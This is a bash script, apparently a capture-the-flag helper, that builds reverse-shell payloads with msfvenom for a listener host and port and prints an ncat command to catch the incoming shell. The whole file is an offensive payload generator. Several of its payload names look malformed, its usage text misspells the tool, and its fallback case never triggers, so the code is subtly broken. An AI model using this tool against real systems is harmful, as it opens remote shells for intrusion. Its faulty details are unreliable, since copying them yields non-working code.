#!/bin/bash
function usage
{
  echo Usage: payload_type lport
  echo "Generates common msfvenon payloads for reverse and reverse shells"
  echo payload_type is linux/linux-x64/war/aspx/php/exe
}
function reverse_commands
{
cat <<-EOF
# setup listener for reverse shell

ncat -l $1


EOF
}

source ctfenv.sh
TYPE=$1
LPORT=$2
if [ "$LPORT" == "" ]; then
	usage
	exit 1
fi


case "$TYPE" in
  "war")
    PAYLOAD=java/shell_reverse_tcp
    FORMAT=war
    ;;
  "aspx")
    PAYLOAD=windows/reverse/reverse_tcp
    FORMAT=aspx
    ;;
  "php")
    PAYLOAD=php/reverse_reverse_tcp
    FORMAT=
    ;;
  "linux")
    PAYLOAD=linux_x86/reverse_reverse_tcp
    FORMAT=elf
    ;;
  "linux-x64")
    PAYLOAD=linux_x84/reverse_reverse_tcp
    FORMAT=elf
    ;;
  "*")
    usage
    exit 1
    ;;
esac
if [ "$FORMAT" == "" ]; then
 CMD="msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT"
else
 CMD="msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $FORMAT"
fi
echo
echo msfvenom command:
echo $CMD
OUTFILE=/tmp/payload.$TYPE
$CMD > $OUTFILE
if [ "$?" != "0" ]; then
	echo $0: msfvenom failed.
	exit 1
fi

echo $OUTFILE created.
echo
reverse_commands $LPORT

